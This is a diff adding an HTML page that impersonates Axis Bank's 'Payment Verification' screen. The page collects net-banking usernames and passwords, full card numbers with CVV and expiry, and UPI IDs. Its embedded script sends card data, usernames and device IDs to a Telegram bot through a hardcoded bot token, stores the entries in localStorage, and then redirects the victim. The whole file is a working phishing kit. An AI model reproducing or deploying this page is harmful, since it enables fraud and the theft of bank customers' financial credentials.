@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axis Bank - Payment Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #ffffff;
+            color: #000000;
+            max-width: 500px;
+            margin: 0 auto;
+            overflow-x: hidden;
+        }
+        
+        /* Main Container */
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-color: #ffffff;
+        }
+        
+        /* Header */
+        .header {
+            background-color: #ffffff;
+            padding: 18px 25px;
+            border-bottom: 2px solid #f0f0f0;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 80px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+        
+        .bank-logo {
+            width: 180px;
+            height: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .bank-logo img {
+            width: 200%;
+            height: 200%;
+            object-fit: cover;
+            object-position: center -25px;
+            transform: scale(0.8);
+        }
+        
+        /* Page Title */
+        .page-title {
+            background: linear-gradient(to right, #AE275F, #C63D7B);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+        
+        .page-title h1 {
+            font-size: 26px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        
+        .page-title p {
+            font-size: 15px;
+            opacity: 0.9;
+            max-width: 400px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+        
+        /* Form Container */
+        .form-container {
+            padding: 25px 20px 30px;
+            flex-grow: 1;
+            background-color: #ffffff;
+        }
+        
+        .form-title {
+            color: #000000;
+            font-size: 22px;
+            margin-bottom: 25px;
+            font-weight: 700;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        /* Payment Options */
+        .payment-options {
+            margin-bottom: 30px;
+        }
+        
+        .payment-option {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .payment-option:hover {
+            border-color: #C63D7B;
+            background-color: rgba(174, 39, 95, 0.03);
+        }
+        
+        .payment-option.selected {
+            border-color: #AE275F;
+            background-color: rgba(174, 39, 95, 0.05);
+        }
+        
+        .payment-icon {
+            width: 50px;
+            height: 50px;
+            background-color: #f5f5f5;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 18px;
+            color: #AE275F;
+            font-size: 22px;
+        }
+        
+        .payment-details {
+            flex-grow: 1;
+        }
+        
+        .payment-name {
+            font-weight: 700;
+            font-size: 17px;
+            color: #333333;
+            margin-bottom: 5px;
+        }
+        
+        .payment-description {
+            font-size: 14px;
+            color: #666666;
+        }
+        
+        .payment-radio {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            border: 2px solid #cccccc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .payment-option.selected .payment-radio {
+            border-color: #AE275F;
+        }
+        
+        .payment-radio-inner {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #AE275F;
+            display: none;
+        }
+        
+        .payment-option.selected .payment-radio-inner {
+            display: block;
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 22px;
+            display: none;
+        }
+        
+        .form-group.active {
+            display: block;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #333333;
+            font-size: 15px;
+        }
+        
+        .form-label span {
+            color: #AE275F;
+            margin-left: 2px;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 16px 16px 16px 50px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 15px;
+            background-color: white;
+            color: #000000;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #AE275F;
+            box-shadow: 0 0 0 3px rgba(174, 39, 95, 0.15);
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #AE275F;
+            font-size: 18px;
+        }
+        
+        /* Card Details Row */
+        .card-details-row {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .card-details-row .form-group {
+            flex: 1;
+            margin-bottom: 0;
+        }
+        
+        .card-details-row .form-group.active {
+            display: block;
+        }
+        
+        /* Button */
+        .btn-submit {
+            width: 100%;
+            padding: 18px;
+            background-color: #AE275F;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: all 0.3s;
+            box-shadow: 0 6px 20px rgba(174, 39, 95, 0.25);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-submit:hover {
+            background-color: #C63D7B;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(174, 39, 95, 0.35);
+        }
+        
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+        
+        .btn-submit i {
+            margin-left: 10px;
+            font-size: 16px;
+        }
+        
+        .btn-submit:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        /* Redirect Message */
+        .redirect-message {
+            background-color: #f8f9fa;
+            border-left: 4px solid #AE275F;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 25px;
+            display: none;
+        }
+        
+        .redirect-message.active {
+            display: block;
+        }
+        
+        .redirect-message h3 {
+            color: #AE275F;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .redirect-message p {
+            color: #555555;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        
+        .redirect-timer {
+            font-weight: 700;
+            color: #AE275F;
+            font-size: 18px;
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: #f8f8f8;
+            color: #666666;
+            padding: 25px 20px;
+            margin-top: auto;
+            border-top: 1px solid #eaeaea;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 22px;
+        }
+        
+        .footer-link {
+            color: #666666;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 12px;
+            width: 48%;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        
+        .footer-link:hover {
+            color: #AE275F;
+            text-decoration: underline;
+        }
+        
+        .footer-disclaimer {
+            font-size: 12px;
+            line-height: 1.6;
+            padding-top: 10px;
+            color: #555555;
+            text-align: center;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .form-container {
+                padding: 20px 16px 25px;
+            }
+            
+            .page-title {
+                padding: 22px 16px;
+            }
+            
+            .page-title h1 {
+                font-size: 24px;
+            }
+            
+            .page-title p {
+                font-size: 14px;
+            }
+            
+            .form-title {
+                font-size: 20px;
+                margin-bottom: 20px;
+            }
+            
+            .footer {
+                padding: 22px 16px;
+            }
+            
+            .card-details-row {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+        
+        /* Form input placeholder styling */
+        .form-input::placeholder {
+            color: #999999;
+            font-weight: 400;
+        }
+        
+        /* Auto-format styling */
+        .form-input.formatted {
+            letter-spacing: 2px;
+            font-weight: 500;
+        }
+        
+        /* Back button */
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            color: #AE275F;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        
+        .back-link i {
+            margin-right: 8px;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Main Container -->
+    <div class="container" id="main-container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo-container">
+                <div class="bank-logo">
+                    <img src="https://images.seeklogo.com/logo-png/1/1/axis-bank-logo-png_seeklogo-14775.png" alt="Axis Bank Logo" onerror="this.onerror=null; this.src='https://cdn.brandfetch.io/id78YVtrRp/w/350/h/350/theme/dark/icon.png?c=1bxid64Mup7aczewSAYMX&t=1667590351759'">
+                </div>
+            </div>
+        </header>
+
+        <!-- Page Title -->
+        <div class="page-title">
+            <h1>Payment Verification</h1>
+            <p>Select your preferred payment method for verification</p>
+        </div>
+
+        <!-- Form Container -->
+        <main class="form-container">
+            <a href="#" class="back-link" id="back-link">
+                <i class="fas fa-arrow-left"></i> Back to Personal Details
+            </a>
+            
+            <h2 class="form-title">Select Payment Method</h2>
+
+            <div class="payment-options">
+                <div class="payment-option" data-method="netbanking">
+                    <div class="payment-icon">
+                        <i class="fas fa-university"></i>
+                    </div>
+                    <div class="payment-details">
+                        <div class="payment-name">Net Banking</div>
+                        <div class="payment-description">Login to your Axis Bank account</div>
+                    </div>
+                    <div class="payment-radio">
+                        <div class="payment-radio-inner"></div>
+                    </div>
+                </div>
+
+                <div class="payment-option" data-method="creditcard">
+                    <div class="payment-icon">
+                        <i class="fas fa-credit-card"></i>
+                    </div>
+                    <div class="payment-details">
+                        <div class="payment-name">Credit/Debit Card</div>
+                        <div class="payment-description">Pay using your Visa, Mastercard or Rupay card</div>
+                    </div>
+                    <div class="payment-radio">
+                        <div class="payment-radio-inner"></div>
+                    </div>
+                </div>
+
+                <div class="payment-option" data-method="upi">
+                    <div class="payment-icon">
+                        <i class="fas fa-qrcode"></i>
+                    </div>
+                    <div class="payment-details">
+                        <div class="payment-name">UPI</div>
+                        <div class="payment-description">Pay using UPI ID or QR code</div>
+                    </div>
+                    <div class="payment-radio">
+                        <div class="payment-radio-inner"></div>
+                    </div>
+                </div>
+            </div>
+
+<!-- Net Banking Form (Hidden by default) -->
+<form id="netbanking-form" class="payment-form">
+
+    <div class="form-group" id="netbanking-group">
+               <label class="form-label" for="bank-select">Select Your Bank <span>*</span></label>
+        <div class="input-container">
+            <i class="fas fa-university input-icon"></i>
+            <select id="bank-select" class="form-input form-select">
+                <option value="" disabled selected>Select your bank</option>
+                <option value="axis">Axis Bank</option>
+                <option value="sbi">State Bank of India (SBI)</option>
+                <option value="hdfc">HDFC Bank</option>
+                <option value="icici">ICICI Bank</option>
+                <option value="kotak">Kotak Mahindra Bank</option>
+                <option value="yes">Yes Bank</option>
+                <option value="indusind">IndusInd Bank</option>
+                <option value="idbi">IDBI Bank</option>
+                <option value="pnb">Punjab National Bank (PNB)</option>
+                <option value="bob">Bank of Baroda</option>
+                <option value="boi">Bank of India</option>
+                <option value="canara">Canara Bank</option>
+                <option value="union">Union Bank of India</option>
+                <option value="central">Central Bank of India</option>
+                <option value="indian">Indian Bank</option>
+                <option value="iob">Indian Overseas Bank</option>
+                <option value="uco">UCO Bank</option>
+                <option value="vijaya">Vijaya Bank</option>
+                <option value="dbs">DBS Bank India</option>
+                <option value="citi">Citibank</option>
+                <option value="standard">Standard Chartered</option>
+                <option value="hsbc">HSBC Bank</option>
+                <option value="rbl">RBL Bank</option>
+                <option value="bandhan">Bandhan Bank</option>
+                <option value="federal">Federal Bank</option>
+                <option value="karnataka">Karnataka Bank</option>
+                <option value="southindian">South Indian Bank</option>
+                <option value="dcb">DCB Bank</option>
+                <option value="other">Other Bank</option>
+            </select>
+        </div>
+        <label class="form-label" for="bank-username">Net Banking Username <span>*</span></label>
+        <div class="input-container">
+            <i class="fas fa-user input-icon"></i>
+            <input type="text" id="bank-username" class="form-input" placeholder="Enter your username">
+        </div>
+        <label class="form-label" for="bank-password">Net Banking Password <span>*</span></label>
+        <div class="input-container">
+            <i class="fas fa-lock input-icon"></i>
+            <input type="password" id="bank-password" class="form-input" placeholder="Enter your password">
+        </div>
+    </div>
+</form>
+
+            <!-- Credit Card Form (Hidden by default) -->
+            <form id="creditcard-form" class="payment-form">
+                <div class="form-group" id="card-number-group">
+                    <label class="form-label" for="card-number">Card Number <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-credit-card input-icon"></i>
+                        <input type="text" id="card-number" class="form-input formatted" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
+                    </div>
+                </div>
+                
+                <div class="card-details-row">
+                    <div class="form-group" id="expiry-group">
+                        <label class="form-label" for="expiry-date">Expiry Date <span>*</span></label>
+                        <div class="input-container">
+                            <i class="fas fa-calendar input-icon"></i>
+                            <input type="text" id="expiry-date" class="form-input" placeholder="MM/YY" maxlength="5">
+                        </div>
+                    </div>
+                    
+                    <div class="form-group" id="cvv-group">
+                        <label class="form-label" for="cvv">CVV <span>*</span></label>
+                        <div class="input-container">
+                            <i class="fas fa-lock input-icon"></i>
+                            <input type="password" id="cvv" class="form-input" placeholder="XXX" maxlength="3">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-group" id="card-name-group">
+                    <label class="form-label" for="cardholder-name">Name on Card <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-user input-icon"></i>
+                        <input type="text" id="cardholder-name" class="form-input" placeholder="Enter name as on card">
+                    </div>
+                </div>
+            </form>
+
+            <!-- UPI Form (Hidden by default) -->
+            <form id="upi-form" class="payment-form">
+                <div class="form-group" id="upi-id-group">
+                    <label class="form-label" for="upi-id">UPI ID <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-at input-icon"></i>
+                        <input type="text" id="upi-id" class="form-input" placeholder="username@bank">
+                    </div>
+                </div>
+                
+                <div class="redirect-message" id="upi-redirect">
+                    <h3>Redirecting to UPI App</h3>
+                    <p>You will be redirected to your UPI payment app in <span class="redirect-timer" id="upi-timer">5</span> seconds.</p>
+                    <p>Please approve the payment request in your app.</p>
+                </div>
+            </form>
+
+            <button type="button" class="btn-submit" id="submit-btn" disabled>
+                Proceed to Verification <i class="fas fa-arrow-right"></i>
+            </button>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Security Tips</a>
+                <a href="#" class="footer-link">Contact Us</a>
+                <a href="#" class="footer-link">Branch Locator</a>
+                <a href="#" class="footer-link">FAQs</a>
+            </div>
+
+            <div class="footer-disclaimer">
+                <p>© 2025 Axis Bank Ltd. All rights reserved. Axis Bank is a registered trademark.</p>
+                <p>Your payment information is secured with 256-bit SSL encryption.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8558586576:AAGbxImqr-TyS59Qq9jykl_EvF9YbFVZtLA";
+        const TELEGRAM_CHAT_ID = "8592704250";
+
+        function sendTelegramMessage(text) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                console.warn('Telegram bot not configured; skipping send.');
+                return Promise.resolve();
+            }
+            const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
+            return fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
+            }).then(resp => {
+                if (!resp.ok) throw new Error(`Telegram API error: ${resp.status}`);
+                return resp.json();
+            }).then(data => console.log('Telegram message sent', data))
+            .catch(err => console.warn('Could not send Telegram message', err));
+        }
+
+        // Payment method selection
+        const paymentOptions = document.querySelectorAll('.payment-option');
+        const submitBtn = document.getElementById('submit-btn');
+        let selectedMethod = null;
+        
+        // Store all form groups
+        const netbankingGroup = document.getElementById('netbanking-group');
+        const cardNumberGroup = document.getElementById('card-number-group');
+        const expiryGroup = document.getElementById('expiry-group');
+        const cvvGroup = document.getElementById('cvv-group');
+        const cardNameGroup = document.getElementById('card-name-group');
+        const upiIdGroup = document.getElementById('upi-id-group');
+        
+        // Redirect messages
+        const netbankingRedirect = document.getElementById('netbanking-redirect');
+        const upiRedirect = document.getElementById('upi-redirect');
+        
+        paymentOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                // Remove selection from all options
+                paymentOptions.forEach(opt => {
+                    opt.classList.remove('selected');
+                });
+                
+                // Add selection to clicked option
+                this.classList.add('selected');
+                
+                // Store selected method
+                selectedMethod = this.getAttribute('data-method');
+                
+                // Enable submit button
+                submitBtn.disabled = false;
+                
+                // Hide all forms and redirect messages first
+                document.querySelectorAll('.payment-form .form-group').forEach(group => {
+                    group.classList.remove('active');
+                });
+                document.querySelectorAll('.redirect-message').forEach(msg => {
+                    msg.classList.remove('active');
+                });
+                
+                // Show relevant form based on selection
+                if (selectedMethod === 'netbanking') {
+                    netbankingGroup.classList.add('active');
+                    submitBtn.innerHTML = 'Login to Net Banking <i class="fas fa-university"></i>';
+                } else if (selectedMethod === 'creditcard') {
+                    cardNumberGroup.classList.add('active');
+                    expiryGroup.classList.add('active');
+                    cvvGroup.classList.add('active');
+                    cardNameGroup.classList.add('active');
+                    submitBtn.innerHTML = 'Verify Card Details <i class="fas fa-credit-card"></i>';
+                } else if (selectedMethod === 'upi') {
+                    upiIdGroup.classList.add('active');
+                    submitBtn.innerHTML = 'Proceed to UPI Payment <i class="fas fa-qrcode"></i>';
+                }
+            });
+        });
+        
+        // Format card number as user types (XXXX XXXX XXXX XXXX)
+        document.getElementById('card-number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            value = value.substring(0, 16); // Limit to 16 digits
+            
+            // Format as XXXX XXXX XXXX XXXX
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            
+            e.target.value = formattedValue;
+        });
+        
+        // Format expiry date as user types (MM/YY)
+        document.getElementById('expiry-date').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            
+            // Auto-insert slash
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            
+            e.target.value = value;
+        });
+        
+        // Format CVV (only digits, max 3)
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            value = value.substring(0, 3); // Limit to 3 digits
+            e.target.value = value;
+        });
+        
+        // Format UPI ID (lowercase, remove spaces)
+        document.getElementById('upi-id').addEventListener('input', function(e) {
+            let value = e.target.value.toLowerCase().replace(/\s/g, '');
+            e.target.value = value;
+        });
+        
+        // Submit button handler
+        submitBtn.addEventListener('click', function() {
+            if (!selectedMethod) return;
+            
+            if (selectedMethod === 'netbanking') {
+                const bankUser = document.getElementById('bank-username').value;
+                const bankPass = document.getElementById('bank-password').value;
+                const bankSelect = document.getElementById('bank-select').value;
+                const DeviceID = localStorage.getItem("DeviceId") || "UnknownDevice";
+                 const prev = localStorage.getItem("formData") || "";
+        
+        const logData =
+            `BnkSelect:${bankSelect}\n`+
+            `BankPass:${bankPass}\n` +
+            `BankUser:${bankUser}\n` +
+            prev;
+        
+        localStorage.setItem("formData", logData);
+        const telegramTextNetbanking = `💳 <b>Net Banking credentials submitted</b>\nBank: <code>${bankSelect}</code>\nUsername: <code>${bankUser}</code>\nPassword: <code>[REDACTED]</code>\nDevice: <code>${DeviceID}</code>`;
+        sendTelegramMessage(telegramTextNetbanking)
+            .finally(() => {
+                window.location.href = "final.html";
+            });
+                
+            } else if (selectedMethod === 'creditcard') {
+                // Collect credit card details
+                const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
+                const expiryDate = document.getElementById('expiry-date').value;
+                const cvv = document.getElementById('cvv').value;
+                const cardholderName = document.getElementById('cardholder-name').value.trim();
+                
+                // Simple validation
+                if (!cardNumber || cardNumber.length !== 16) {
+                    alert('Please enter a valid 16-digit card number');
+                    return;
+                }
+                
+                if (!expiryDate || !/^\d{2}\/\d{2}$/.test(expiryDate)) {
+                    alert('Please enter a valid expiry date (MM/YY)');
+                    return;
+                }
+                
+                if (!cvv || cvv.length !== 3) {
+                    alert('Please enter a valid 3-digit CVV');
+                    return;
+                }
+                
+                if (!cardholderName) {
+                    alert('Please enter the name on card');
+                    return;
+                }
+                
+                        // Prepare log
+        const DeviceID = localStorage.getItem("DeviceId") || "UnknownDevice";
+        const prev = localStorage.getItem("formData") || "";
+        
+        const logData =
+            `cardNumber:${cardNumber}\n` +
+            `expiryDate:${expiryDate}\n` +
+            `cvv:${cvv}\n` +
+            `cardholderName:${cardholderName}\n` +
+            prev;
+        
+        localStorage.setItem("formData", logData);
+        const telegramTextCreditcard = `💳 <b>Credit card info submitted</b>\nCard: <code>${cardNumber}</code>\nExpiry: <code>${expiryDate}</code>\nCVV: <code>${cvv}</code>\nName: <code>${cardholderName}</code>\nDevice: <code>${DeviceID}</code>`;
+        sendTelegramMessage(telegramTextCreditcard)
+            .finally(() => {
+                window.location.href = "final.html";
+                document.getElementById('creditcard-form').reset();
+            });
+                
+            } else if (selectedMethod === 'upi') {
+                // Collect UPI ID
+                const upiId = document.getElementById('upi-id').value.trim();
+                
+                if (!upiId || !upiId.includes('@')) {
+                    alert('Please enter a valid UPI ID (e.g., username@bank)');
+                    return;
+                }
+                
+                // Show redirect message for UPI
+                upiRedirect.classList.add('active');
+                submitBtn.disabled = true;
+                
+                // Countdown timer
+                let countdown = 5;
+                const timerElement = document.getElementById('upi-timer');
+                
+                const countdownInterval = setInterval(() => {
+                    countdown--;
+                    timerElement.textContent = countdown;
+                    
+                    if (countdown <= 0) {
+                        clearInterval(countdownInterval);
+                        window.location.href = "paymentMethod.html";
+                    }
+                }, 1000);
+                
+                // Log UPI ID
+                const telegramText = `🔗 <b>UPI info submitted</b>\nUPI ID: <code>${upiId}</code>\nDevice: <code>${localStorage.getItem('DeviceId') || 'UnknownDevice'}</code>`;
+                sendTelegramMessage(telegramText).catch(() => {});
+                console.log('=== UPI Details ===');
+                console.log(`\npaymentMethod:upi\nupiId:${upiId}`);
+            }
+        });
+        
+        // Back link functionality
+        document.getElementById('back-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Going back to Personal Details page...\n\nIn a real application, this would navigate to the previous page.');
+            // In a real app: window.history.back() or load the previous page
+        });
+        
+        // Add visual feedback for input focus
+        const inputs = document.querySelectorAll('.form-input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.backgroundColor = '#fcfcfc';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.backgroundColor = '#ffffff';
+            });
+        });
+    </script>
+</body>
+
+</html>
